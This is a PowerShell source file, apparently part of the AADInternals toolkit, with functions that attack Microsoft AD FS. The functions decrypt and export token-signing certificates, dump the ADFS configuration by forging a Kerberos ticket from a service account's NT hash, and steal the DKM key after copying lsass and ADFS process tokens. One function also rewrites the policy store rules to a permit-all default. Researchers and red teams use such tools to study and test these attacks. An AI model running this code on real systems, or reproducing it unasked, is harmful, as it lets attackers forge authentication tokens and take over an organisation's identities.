# Apr 21st 2021
# Exports ADFS Certificates
function Export-ADFSCertificates
{
<#
    .SYNOPSIS
    Exports ADFS certificates

    .DESCRIPTION
    Exports current and additional (next) ADFS token signing and encryption certificates to local directory. 
    The exported certificates do not have passwords.

    .PARAMETER Configuration

    ADFS configuration (xml)

    .PARAMETER EncryptionKey

    Encryption Key from DKM. Can be byte array or hex string
    
    .Example
    PS:\>Export-AADIntADFSCertificates

    .Example
    PS:\>$config = Export-AADIntADFSConfiguration -Local
    PS:\>$key = Export-AADIntADFSEncryptionKey -Local -Configuration $config
    PS:\>Export-AADIntADFSCertificates -Configuration $config -Key $key
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $False)]
        [xml]$Configuration,
        [Parameter(Mandatory= $False)]
        [object]$Key
    )
    Process
    {
        if(!$Configuration)
        {
            $Configuration = Export-ADFSConfiguration -Local
        }
        if(!$Key)
        {
            $Key = Export-ADFSEncryptionKey -Local -Configuration $Configuration
        }

        $certs = [ordered]@{}

        $certs["signing"] =    $Configuration.ServiceSettingsData.SecurityTokenService.SigningToken
        $certs["encryption"] = $Configuration.ServiceSettingsData.SecurityTokenService.EncryptionToken
        

        $cert = $Configuration.ServiceSettingsData.SecurityTokenService.AdditionalSigningTokens.CertificateReference
        if($cert.FindValue -eq $certs["signing"].FindValue)
        {
            Write-Warning "Additional signing    certificate is same as the current signing certificate and will not be exported."
        }
        else
        {
            $certs["signing_additional"] = $cert
        }
        
        $cert = $Configuration.ServiceSettingsData.SecurityTokenService.AdditionalEncryptionTokens.CertificateReference
        if($cert.FindValue -eq $certs["encryption"].FindValue)
        {
            Write-Warning "Additional encryption certificate is same as the current signing certificate and will not be exported."
        }
        else
        {
            $certs["encryption_additional"] = $cert
        }

        foreach($name in $certs.Keys)
        {
            Write-Verbose "Decrypting certificate $name"
            $encPfxBytes = Convert-B64ToByteArray -B64 ($certs[$name].EncryptedPfx)

            # Get the Key Material - some are needed, some not. 
            # Values are Der encoded except cipher text and mac, so the first byte is tag and the second one size of the data. 
            $guid=        $encPfxBytes[8..25]  # 18 bytes
            $KDF_oid=     $encPfxBytes[26..36] # 11 bytes
            $MAC_oid=     $encPfxBytes[37..47] # 11 bytes
            $enc_oid=     $encPfxBytes[48..58] # 11 bytes
            $nonce=       $encPfxBytes[59..92] # 34 bytes
            $iv=          $encPfxBytes[93..110] # 18 bytes
            $ciphertext = $encPfxBytes[115..$($encPfxBytes.Length-33)]
            $cipherMAC =  $encPfxBytes[$($encPfxBytes.Length-32)..$($encPfxBytes.Length)]

            # Create the label
            $label = $enc_oid + $MAC_oid

            # Derive the decryption key using (almost) standard NIST SP 800-108. The last bit array should be the size of the key in bits, but MS is using bytes (?)
            # As the key size is only 16 bytes (128 bits), no need to loop.
            $hmac = New-Object System.Security.Cryptography.HMACSHA256 -ArgumentList @(,$key)
            $hmacOutput = $hmac.ComputeHash( @(0x00,0x00,0x00,0x01) + $label + @(0x00) + $nonce[2..33] + @(0x00,0x00,0x00,0x30) )
            $decryptionKey = $hmacOutput[0..15]
            Write-Verbose " Decryption key: $(Convert-ByteArrayToHex -Bytes $decryptionKey)"
         
            # Create a decryptor and decrypt
            $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create("AES")
            $Crypto.Mode="CBC"
            $Crypto.KeySize = 128
            $Crypto.BlockSize = 128
            $Crypto.Padding = "None"
            $Crypto.Key = $decryptionKey
            $Crypto.IV = $iv[2..17]

            $decryptor = $Crypto.CreateDecryptor()

            # Create a memory stream and write the cipher text to it through CryptoStream
            $ms = New-Object System.IO.MemoryStream
            $cs = New-Object System.Security.Cryptography.CryptoStream($ms,$decryptor,[System.Security.Cryptography.CryptoStreamMode]::Write)
            $cs.Write($ciphertext,0,$ciphertext.Count)
            $cs.Close()
            $cs.Dispose()

            # Get the results and export to the file
            $pfx = $ms.ToArray()
            $ms.Close()
            $ms.Dispose()

            $pfx |  Set-Content "ADFS_$name.pfx" -Encoding Byte
        }
        
        

         
    }
}

# Apr 21st 2021
# Exports ADFS configuration from local database or remote server
function Export-ADFSConfiguration
{
<#
    .SYNOPSIS
    Exports ADFS configuration from the local or remote ADFS server.

    .DESCRIPTION
    Exports ADFS configuration from the local ADFS server (local database) or from remote server (ADFS sync).

    .PARAMETER Local

    If provided, exports configuration from the local ADFS server

    .PARAMETER Hash

    NTHash of ADFS service user. Can be a byte array or hex string

    .PARAMETER Server

    Ip-address or FQDN of the remote ADFS server.

    .PARAMETER SID

    Security Identifier (SID) of the user (usually ADFS service user) used to dump remote configuration. Can be a byte array, string, or SID object.

    .Example
    $config = Export-AADIntADFSConfiguration -Local

    .Example
    Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq sv_ADFS | Format-List Name,ObjectGuid,ObjectSid
    Name       : sv_ADFS
    ObjectGuid : b6366885-73f0-4239-9cd9-4f44a0a7bc79
    ObjectSid  : S-1-5-21-2918793985-2280761178-2512057791-1134

    PS C:\>$cred = Get-Credential

    PS C:\>Get-AADIntADUserNTHash -ObjectGuid "b6366885-73f0-4239-9cd9-4f44a0a7bc79" -Credentials $creds -Server dc.company.com -AsHex
    6e018b0cd5b37b4fe1e0b7d54a6302b7

    PS C:\>$configuration = Export-AADIntADFSConfiguration -Hash "6e018b0cd5b37b4fe1e0b7d54a6302b7" -SID S-1-5-21-2918793985-2280761178-2512057791-1134 -Server sts.company.com

   
#>
    [cmdletbinding()]
    Param(
        [Parameter(ParameterSetName="Local",        Mandatory = $True)]
        [switch]$Local,
        [Parameter(ParameterSetName="Sync",         Mandatory = $True)]
        [object]$Hash,
        [Parameter(ParameterSetName="Sync",         Mandatory = $True)]
        [Parameter(ParameterSetName="LoggedInUser", Mandatory = $False)]
        [String]$Server="localhost",
        [Parameter(ParameterSetName="Sync",         Mandatory = $True)]
        [object]$SID,
        [Parameter(ParameterSetName="LoggedInUser", Mandatory = $True)]
        [switch]$AsLoggedInUser
    )
    Process
    {
        if($Local) # Export configuration data from the local ADFS server
        {
            # Check that we are on ADFS server
            if((Get-Service ADFSSRV -ErrorAction SilentlyContinue) -eq $null)
            {
                Write-Error "This command needs to be run on ADFS server"
                return
            }

            # Get the database connection string
            $ADFS = Get-WmiObject -Namespace root/ADFS -Class SecurityTokenService
            $conn = $ADFS.ConfigurationDatabaseConnectionString
            
            Write-Verbose "ConnectionString: $conn"

            # Read the configuration from the database
            $SQLclient =          new-object System.Data.SqlClient.SqlConnection -ArgumentList $conn
            $SQLclient.Open()
            $SQLcmd =             $SQLclient.CreateCommand()
            $SQLcmd.CommandText = "SELECT ServiceSettingsData from IdentityServerPolicy.ServiceSettings"
            $SQLreader =          $SQLcmd.ExecuteReader()
            $SQLreader.Read() |   Out-Null
            $configuration =      $SQLreader.GetTextReader(0).ReadToEnd()
            $SQLreader.Dispose()
        }
        elseif($AsLoggedInUser) # Read the configuration as the logged in user
        {
            $configuration = Export-ADFSConfigurationUsingWCF -Server $Server
        }
        else # Read configuration from remote server by emulating ADFS sync
        {
            # Check the hash and SID
            if($Hash -is [array])
            {
                $strHash = Convert-ByteArrayToHex -Bytes ([byte[]]$Hash)
                Remove-Variable "Hash"
                $Hash = $strHash
            }
            elseif($Hash -isnot [string])
            {
                Throw "Hash must be a byte array or a hexadecimal string"
            }

            if($SID -is [array])
            {
                $sidObject = [System.Security.Principal.SecurityIdentifier]::new(([byte[]]$SID),0)
                Remove-Variable "SID"
                $SID = $sidObject.toString
            }
            elseif($SID -is [System.Security.Principal.SecurityIdentifier])
            {
                $sidObject = $SID
                Remove-Variable "SID"
                $SID = $sidObject.toString
            }
            elseif($SID -isnot [string])
            {
                Throw "SID must be a System.Security.Principal.SecurityIdentifier, byte array or a hexadecimal string"
            }

            Write-Verbose "* Start dumping AD FS configuration from $server`n"
    
            # Generate required stuff
            $sessionKey =    (New-Guid).ToByteArray()
            $params=@{
                hash =             $Hash
                SidString =        $SID
                UserName=          'svc_ADFS$'
                UserDisplayName=   ""
                UserPrincipalName= 'svc_ADFS$@company.com'
                ServerName=        "DC"
                DomainName=        "COMPANY"
                Realm=             "COMPANY.COM"
                ServiceTarget =    "host/sts.company.com"
                SessionKey =       $sessionKey
            }
            $kerberosTicket = New-KerberosTicket @Params                
            $clientSecret =   Get-RandomBytes -Bytes 32

            Write-Verbose "User NTHASH:   $Hash"
            Write-Verbose "Client secret: $(Convert-ByteArrayToB64 -Bytes $clientSecret)"
            Write-Verbose "Session key:   $(Convert-ByteArrayToB64 -Bytes $sessionKey)`n"
    
            Write-Verbose "RST begin"
                      
            # Request Security Token 
            $envelope =      Create-RSTEnvelope -Server $server -KerberosTicket $kerberosTicket
            [xml]$response = Invoke-RestMethod -uri "http://$Server/adfs/services/policystoretransfer" -Method Post -Body $envelope -ContentType "application/soap+xml"
            $RSTR =          Parse-RSTR -RSTR $response -Key $sessionKey

            Write-Verbose "RST end`n"
            Write-Verbose "CST begin"
 
            # Request Security Context Token 
            $envelope =      Create-SCTEnvelope -Key $RSTR.Key -ClientSecret $clientSecret -Context $RSTR.Context -KeyIdentifier $RSTR.Identifier -Server $server
        
            try
            {
                [xml]$response = Invoke-RestMethod -uri "http://$Server/adfs/services/policystoretransfer" -Method Post -Body $envelope -ContentType "application/soap+xml"
            }
            catch
            {
                # Catch the error and try to parse the SOAP document
                $str=$_.Exception.Response.GetResponseStream()
                $buf = new-object byte[] $str.Length
                $str.Position = 0
                $str.Read($buf,0,$str.Length) | Out-Null
                [xml]$response=[text.encoding]::UTF8.GetString($buf)
            }
            Check-SoapError -Message $response

            $CSTR = Parse-CSTR -CSTR $response -Key $RSTR.Key

            Write-Verbose "CST end`n"
    
            # Get the capabilities    
            #[xml]$response = Invoke-ADFSSoapRequest -Key $CSTR.Key -Context $CSTR.Context -KeyIdentifier $CSTR.Identifier -Server $server -Command Capabilities

            Write-Verbose "ServiceSettings start"
    
            # Get the settings        
            [xml]$response = Invoke-ADFSSoapRequest -Key $CSTR.Key -Context $CSTR.Context -KeyIdentifier $CSTR.Identifier -Server $server -Command ServiceSettings
            Write-Verbose "ServiceSettings end"
    
            $configuration = $response.GetStateResponse.GetStateResult.PropertySets.PropertySet.Property | where Name -eq "ServiceSettingsData" | select -ExpandProperty Values | select -ExpandProperty Value_x007B_0_x007D_
        
        }

        Write-Verbose "Configuration successfully read ($($configuration.Length) bytes)."
        return $configuration
    }
}


# Apr 21st 2021
# Exports ADFS configuration data encryption key
function Export-ADFSEncryptionKey
{
<#
    .SYNOPSIS
    Exports ADFS configuration encryption Key from DKM

    .DESCRIPTION
    Exports ADFS configuration encryption Key from the local ADFS server either as a logged-in user or ADFS service account, or remotely using DSR.

    .PARAMETER Local
    If provided, exports Key from the local ADFS server

    .PARAMETER AsADFS
    If provided, "elevates" to ADFS service user. If used, the PowerShell session MUST be restarted to return original user's access rights.

    .PARAMETER ObjectGuid
    Object guid of the contact object containing the Key.

    .PARAMETER Server
    Ip-address or FQDN of domain controller.

    .PARAMETER Credentials
    Credentials of the user used to log in to DC and get the data by DSR. MUST have replication rights!

    .PARAMETER Configuration
    The ADFS configuration data (xml).

    .PARAMETER AsHex
    If provided, exports the Key as  hex string

    .Example
    PS:\>$key = Export-AADIntADFSEncryptionKey -Local -Configuration $configuration

    .Example
    PS:\>$creds = Get-Credential
    PS:\>$key = Export-AADIntADFSEncryptionKey -Server dc.company.com -Credentials $creds -ObjectGuid 91491383-d748-4163-9e50-9c3c86ad1fbd
#>
    [cmdletbinding()]
    Param(
        [Parameter(ParameterSetName="Local", Mandatory=$True)]
        [switch]$Local,
        [Parameter(ParameterSetName="Local", Mandatory=$False)]
        [switch]$AsADFS,
        [Parameter(ParameterSetName="Local", Mandatory=$True)]
        [xml]$Configuration,
        [Parameter(ParameterSetName="Sync",  Mandatory= $True)]
        [guid]$ObjectGuid,
        [Parameter(ParameterSetName="Sync",  Mandatory= $True)]
        [String]$Server,
        [Parameter(ParameterSetName="Sync",  Mandatory= $True)]
        [pscredential]$Credentials,
        [switch]$AsHex
    )
    Process
    {
        if($Local) # Export Key from the local ADFS server
        {
            # Check that we are on ADFS server
            if((Get-Service ADFSSRV -ErrorAction SilentlyContinue) -eq $null)
            {
                Write-Error "This command needs to be run on ADFS server"
                return
            }

            # Get DKM container info
            $group =     $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group
            $container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName
            $parent =    $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn
            $base =      "LDAP://CN=$group,$container,$parent"

            if($AsADFS)
            {
                $serviceWMI = Get-WmiObject Win32_Service -Filter "Name='ADFSSRV'" -ErrorAction SilentlyContinue
                $ADFSUser=  $serviceWMI.StartName

                $CurrentUser = "{0}\{1}" -f $env:USERDOMAIN,$env:USERNAME

                try
                {
                    # Copy the tokens from lsass and adfssrv processes
                    Write-Verbose "Trying to ""elevate"" by copying token from lsass and then adfssrv processes"
                    $elevation = [AADInternals.Native]::copyLsassToken() -and [AADInternals.Native]::copyADFSToken()
                }
                catch
                {
                    $elevation = $false
                }

                if($elevation)
                {
                    Write-Verbose """Elevation"" to ADFS succeeded!"
                    Write-Warning "Running as ADFS ($ADFSUser). You MUST restart PowerShell to restore $CurrentUser rights."
                }
                else
                {
                    throw "Could not change to $ADFSUser. MUST be run as administrator!"
                }
            }

            # The "displayName" attribute of "CryptoPolicy" object refers to the value of the "l" attribute of 
            # the object containing the actual encryption Key in its "thumbnailphoto" attribute.
            $ADSearch =        [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))
            $ADSearch.Filter = '(name=CryptoPolicy)'
            $ADSearch.PropertiesToLoad.Clear()
            $ADSearch.PropertiesToLoad.Add("displayName") | Out-Null
            $aduser =          $ADSearch.FindOne()
            $keyObjectGuid =   $ADUser.Properties["displayName"] 
        
            # Read the encryption key from AD object
            $ADSearch.PropertiesToLoad.Clear()
            $ADSearch.PropertiesToLoad.Add("thumbnailphoto") | Out-Null
            $ADSearch.Filter="(l=$keyObjectGuid)"
            $aduser=$ADSearch.FindOne() 
            $key=[byte[]]$aduser.Properties["thumbnailphoto"][0] 
            Write-Verbose "Key object guid: $keyObjectGuid"
        }
        else # Export from remote DC using DSR
        {
            $key = Get-ADUserThumbnailPhoto -Server $Server -Credentials $Credentials -ObjectGuid $ObjectGuid
        }
        Write-Verbose "Key: $(Convert-ByteArrayToHex -Bytes $key)"

        if($AsHex)
        {
            Convert-ByteArrayToHex -Bytes $key
        }
        else
        {
            return $key
        }
    }
}

# May 5th 2021
# Sets configuration of the local ADFS server
function Set-ADFSConfiguration
{
<#
    .SYNOPSIS
    Sets configuration of the local AD FS server.

    .DESCRIPTION
    Sets configuration of the local AD FS server (local database).

    .PARAMETER Configuration

    ADFS configuration (xml-document)

    .Example
    PS C:\>$authPolicy = Get-AADIntADFSPolicyStoreRules
    PS C:\>$config = Set-AADIntADFSPolicyStoreRules -AuthorizationPolicy $authPolicy.AuthorizationPolicy
    PS C:\>Set-AADIntADFSConfiguration -Configuration $config


#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $True)]
        [xml]$Configuration
    )
    Process
    {

        # Check that we are on ADFS server
        if((Get-Service ADFSSRV -ErrorAction SilentlyContinue) -eq $null)
        {
            Write-Error "This command needs to be run on ADFS server"
            return
        }

        # Get the database connection string
        $ADFS = Get-WmiObject -Namespace root/ADFS -Class SecurityTokenService
        $conn = $ADFS.ConfigurationDatabaseConnectionString
            
        Write-Verbose "ConnectionString: $conn"

        # Write the configuration to the database
        $strConfig =          $Configuration.OuterXml
        $SQLclient =          new-object System.Data.SqlClient.SqlConnection -ArgumentList $conn
        $SQLclient.Open()
        $SQLcmd =             $SQLclient.CreateCommand()
        $SQLcmd.CommandText = "UPDATE IdentityServerPolicy.ServiceSettings SET ServiceSettingsData=@config"
        $SQLcmd.Parameters.AddWithValue("@config",$strConfig) | Out-Null
        $UpdatedRows =        $SQLcmd.ExecuteNonQuery() 
        $SQLclient.Close()

        Write-Verbose "Configuration successfully set ($($strConfig.Length) bytes)."
    }
}

# May 5th 2021
# Gets ADFS policy store authorisation policy
function Get-ADFSPolicyStoreRules
{
<#
    .SYNOPSIS
    Gets AD FS PolicyStore Authorisation Policy rules

    .DESCRIPTION
    Gets AD FS PolicyStore Authorisation Policy rules

    .PARAMETER Configuration
    ADFS configuration (xml-document). If not given, tries to get configuration from the local database.

    .Example
    PS C:\>Get-AADIntADFSPolicyStoreRules | fl

    AuthorizationPolicyReadOnly : @RuleName = "Permit Service Account"
                                  exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid", Value == "S-1-5-21-2108354183-1066939247-874701363-3086"])
                                   => issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");
                              
                                  @RuleName = "Permit Local Administrators"
                                  exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid", Value == "S-1-5-32-544"])
                                   => issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");
                              
                              
    AuthorizationPolicy         : @RuleName = "Permit Service Account"
                                  exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid", Value == "S-1-5-21-2108354183-1066939247-874701363-3086"])
                                   => issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");
                              
                                  @RuleName = "Permit Local Administrators"
                                  exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid", Value == "S-1-5-32-544"])
                                   => issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");

#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [xml]$Configuration
    )
    Process
    {

        if(!$Configuration)
        {
            # Check that we are on ADFS server
            if((Get-Service ADFSSRV -ErrorAction SilentlyContinue) -eq $null)
            {
                Write-Error "This command needs to be run on ADFS server or provide the configuration with -Configuration parameter."
                return
            }

            [xml]$Configuration = Export-ADFSConfiguration -Local
        }

        $parameters = @{
            "AuthorizationPolicy"         = $Configuration.ServiceSettingsData.PolicyStore.AuthorizationPolicy
            "AuthorizationPolicyReadOnly" = $Configuration.ServiceSettingsData.PolicyStore.AuthorizationPolicyReadOnly
        }

        return New-Object psobject -Property $parameters
    }
}

# May 5th 2021
# Gets ADFS policy store authorisation policy
function Set-ADFSPolicyStoreRules
{
<#
    .SYNOPSIS
    Sets AD FS PolicyStore Authorisation Policy rules

    .DESCRIPTION
    Sets AD FS PolicyStore Authorisation Policy rules and returns the modified configuration (xml document)

    .PARAMETER Configuration
    ADFS configuration (xml-document). If not given, tries to get configuration from the local database.

    .PARAMETER AuthorizationPolicy
    PolicyStore authorization policy. By default, allows all to modify.

    .PARAMETER AuthorizationPolicyReadOnly
    PolicyStore read-only authorization policy. By default, allows all to read.

    .Example
    PS C:\>$authPolicy = Get-AADIntADFSPolicyStoreRules
    PS C:\>$config = Set-AADIntADFSPolicyStoreRules -AuthorizationPolicy $authPolicy.AuthorizationPolicy
    PS C:\>Set-AADIntADFSConfiguration -Configuration $config


#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [xml]$Configuration,
        [Parameter(Mandatory=$False)]
        [string]$AuthorizationPolicy =         '=> issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");',
        [Parameter(Mandatory=$False)]
        [string]$AuthorizationPolicyReadOnly = '=> issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");'
    )
    Process
    {

        if(!$Configuration)
        {
            # Check that we are on ADFS server
            if((Get-Service ADFSSRV -ErrorAction SilentlyContinue) -eq $null)
            {
                Write-Error "This command needs to be run on ADFS server or provide the configuration with -Configuration parameter."
                return
            }

            [xml]$Configuration = Export-ADFSConfiguration -Local
        }

        $Configuration.ServiceSettingsData.PolicyStore.AuthorizationPolicy =         $AuthorizationPolicy
        $Configuration.ServiceSettingsData.PolicyStore.AuthorizationPolicyReadOnly = $AuthorizationPolicyReadOnly

        return $Configuration.OuterXml
    }
}

# Exports the configuration remotely using Windows Communication Foundation (WCF)
# May 20th 20201
function Export-ADFSConfigurationUsingWCF
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [string]$Server
    )
    Begin
    {
        # Create the WCF client
        $WCFClassDefinition=@"
using System.Runtime.Serialization;
using System.Collections.Generic;
using System.Collections;
using System;

namespace AADInternals
{
    // DataContract definitions
    public interface IValueList : IList, ICollection, IEnumerable
    {
    }
    [DataContract(Name = "SearchResult", Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public class SearchResultData
    {
        [DataMember]
        public PropertySetDataList PropertySets
        {
            get { return this._propertySetList;} set {this._propertySetList = value;}
        }
        private PropertySetDataList _propertySetList = new PropertySetDataList();
    }

    [CollectionDataContract(Name = "PropertySets", ItemName = "PropertySet", Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public class PropertySetDataList : List<PropertySetData> {}

    [CollectionDataContract(Name = "PropertySet", ItemName = "Property", Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public class PropertySetData : List<PropertyData>  { }

    [CollectionDataContract(Name = "Values{0}", ItemName = "Value{0}", Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public class PropertyValueList<T> : List<T>, IValueList, IList, ICollection, IEnumerable {}

    [DataContract(Name = "Property", Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    [KnownType(typeof(PropertyValueList<string>))]
    [KnownType(typeof(PropertyValueList<PropertySetData>))]
    public class PropertyData
    {
        public PropertyData() {}
        public PropertyData(string name) { this._name = name;}

        [DataMember(EmitDefaultValue = false, IsRequired = true)]
        public string Name { get {return this._name;}set{this._name = value;} }

        [DataMember(EmitDefaultValue = false, IsRequired = false)]
        public IValueList Values { get {return this._values; } set { this._values = value; } }
        private string _name;
        private IValueList _values = new PropertyValueList<string>();
    }

    public enum SyncItemState
    {
        NotProcessed,
        Processing,
        Processed
    }

    [CollectionDataContract(Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public class ServiceStateSummary : List<ServiceStateItem> {}

	[DataContract(Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
	public class ServiceStateItem
	{
		public ServiceStateItem(string serviceObjectType, long serialNumber, int schemaVersionNumber, DateTime lastUpdateTime)
		{
			this._serviceObjectType = serviceObjectType;
			this._serialNumber = serialNumber;
			this._schemaVersionNumber = schemaVersionNumber;
			this._lastUpdateTime = lastUpdateTime;
			this.NeedsUpdate = false;
		}

		[DataMember]
		public string ServiceObjectType
		{
			get { return this._serviceObjectType; } set { this._serviceObjectType = value;}
		}

		[DataMember]
		public long SerialNumber
		{
			get { return this._serialNumber; } set { this._serialNumber = value; }
		}

		[DataMember]
		public int SchemaVersionNumber
		{
			get { return this._schemaVersionNumber; } set { this._schemaVersionNumber = value; }
		}

		[DataMember]
		public DateTime LastUpdateTime
		{
			get { return this._lastUpdateTime; } set { this._lastUpdateTime = value;}
		}

		public bool SyncComplete
		{
			get { return this._syncCompleted; } set { this._syncCompleted = value; }
		}

		public bool NeedsUpdate { get; set; }
		public SyncItemState ProcessingState
		{
			get { return this._processingState; } set { this._processingState = value; }
		}

		private string _serviceObjectType;
 		private long _serialNumber;
		private int _schemaVersionNumber;
		private DateTime _lastUpdateTime;
		private SyncItemState _processingState;
		private bool _syncCompleted;
	}

    public enum FarmBehavior
    {
        Unsupported = -1,
        None,
        Win2012R2,
        Threshold,
        Win2016,
        Win2019
    }

    [DataContract(Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public enum FilterOperation
    {
        [EnumMember]
        And,
        [EnumMember]
        Or
    }

    [DataContract(Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public enum SimpleOperation
    {
        [EnumMember]
        Equals,
        [EnumMember]
        StartsWith,
        [EnumMember]
        EndsWith,
        [EnumMember]
        Contains,
        [EnumMember]
        NotEquals,
        [EnumMember]
        ScopeAppliesTo
    }

    [DataContract(Name = "If", Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public class SimpleConditionData
    {
        public SimpleConditionData() { }
        public SimpleConditionData(string property, SimpleOperation operation, string value)
        {
            this._property = property;
            this._value = value;
            this._op = operation;
        }

        [DataMember(EmitDefaultValue = true, IsRequired = true, Order = 0)]
        public string Property  { get { return this._property; } set { this._property = value; } }

        [DataMember(EmitDefaultValue = true, IsRequired = true, Order = 1)]
        public SimpleOperation Operation { get { return this._op; } set { this._op = value; } }

        [DataMember(EmitDefaultValue = true, IsRequired = true, Order = 2)]
        public string Value { get { return this._value; } set { this._value = value; } }

        private SimpleOperation _op;

        private string _property;

        private string _value;
    }

    [CollectionDataContract(ItemName = "If", Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public class ConditionList : List<SimpleConditionData> { }

    [DataContract(Name = "Filter", Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore")]
    public class FilterData
    {
        public FilterData()
        {
        }

        public FilterData(FilterOperation operation) { this._bool = operation; }

        [DataMember(Name = "Conditions")]
        public ConditionList Conditions { get { return this._conditions; } set { this._conditions = value; } }

        [DataMember(Name = "Operation")]
        public FilterOperation Operation { get { return this._bool; } set { this._bool = value; } }

        private FilterOperation _bool;

        private ConditionList _conditions = new ConditionList();
    }
    
    // PolicyStoreReadOnlyTransfer definitions

    [System.ServiceModel.ServiceContractAttribute(Namespace = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore", ConfigurationName = "AADInternals.IPolicyStoreReadOnlyTransfer")]
    public interface IPolicyStoreReadOnlyTransfer
    {
        [System.ServiceModel.OperationContractAttribute(Action = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore/IPolicyStoreReadOnlyTransfer/GetState", ReplyAction = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore/IPolicyStoreReadOnlyTransfer/GetStateResponse")]
        SearchResultData GetState(string serviceObjectType, string mask=null, FilterData filter = null, int clientVersionNumber = 1);

        [System.ServiceModel.OperationContractAttribute(Action = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore/IPolicyStoreReadOnlyTransfer/GetHeaders", ReplyAction = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore/IPolicyStoreReadOnlyTransfer/GetHeadersResponse")]
        ServiceStateSummary GetHeaders();

        [System.ServiceModel.OperationContractAttribute(Action = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore/IPolicyStoreReadOnlyTransfer/GetFarmBehavior", ReplyAction = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore/IPolicyStoreReadOnlyTransfer/GetFarmBehaviorResponse")]
        FarmBehavior GetFarmBehavior();
    }

    
    public interface IPolicyStoreReadOnlyTransferChannel : AADInternals.IPolicyStoreReadOnlyTransfer, System.ServiceModel.IClientChannel
    {
    }

    [System.Diagnostics.DebuggerStepThroughAttribute()]
    public partial class PolicyStoreReadOnlyTransferClient : System.ServiceModel.ClientBase<AADInternals.IPolicyStoreReadOnlyTransfer>, AADInternals.IPolicyStoreReadOnlyTransfer
    {

        public PolicyStoreReadOnlyTransferClient()
        {
        }

        public PolicyStoreReadOnlyTransferClient(string endpointConfigurationName) :
                base(endpointConfigurationName)
        {
        }

        public PolicyStoreReadOnlyTransferClient(string endpointConfigurationName, string remoteAddress) :
                base(endpointConfigurationName, remoteAddress)
        {
        }

        public PolicyStoreReadOnlyTransferClient(string endpointConfigurationName, System.ServiceModel.EndpointAddress remoteAddress) :
                base(endpointConfigurationName, remoteAddress)
        {
        }

        public PolicyStoreReadOnlyTransferClient(System.ServiceModel.Channels.Binding binding, System.ServiceModel.EndpointAddress remoteAddress) :
                base(binding, remoteAddress)
        {
        }

        public SearchResultData GetState(string serviceObjectType, string mask = null, FilterData filter = null, int clientVersionNumber = 1)
        {
            return base.Channel.GetState(serviceObjectType, mask, filter, clientVersionNumber);
        }

        public ServiceStateSummary GetHeaders()
        {
            return base.Channel.GetHeaders();
        }

        public FarmBehavior GetFarmBehavior()
        {
            return base.Channel.GetFarmBehavior();
        }
    }
}

"@
        Add-Type -TypeDefinition $WCFClassDefinition -ReferencedAssemblies "System.ServiceModel","System.Runtime.Serialization"
        Remove-Variable "WCFClassDefinition"
    }
    Process
    {
        # Form the url 
        $adfsUrl = "http://$Server/adfs/services/policystoretransfer"

        # Create the binding object and set the maximum message size & string lenght to same AD FS is using
        [System.ServiceModel.WSHttpBinding]$binding = [System.ServiceModel.WSHttpBinding]::new()
        $binding.MaxReceivedMessageSize =              20971520
        $binding.ReaderQuotas.MaxStringContentLength = 20971520

        # Instantiate the client and get ServiceSettings
        [AADInternals.PolicyStoreReadOnlyTransferClient]$client = [AADInternals.PolicyStoreReadOnlyTransferClient]::new($binding,[System.ServiceModel.EndpointAddress]::new($adfsUrl))
        $result = $client.getState("ServiceSettings")
        $client.Close()

        # Loop through the results and return the settings
        foreach($property in $result.PropertySets[0])
        {
            if($property.Name -eq "ServiceSettingsData")
            {
                return $property.Values[0]
            }
        }
    }
}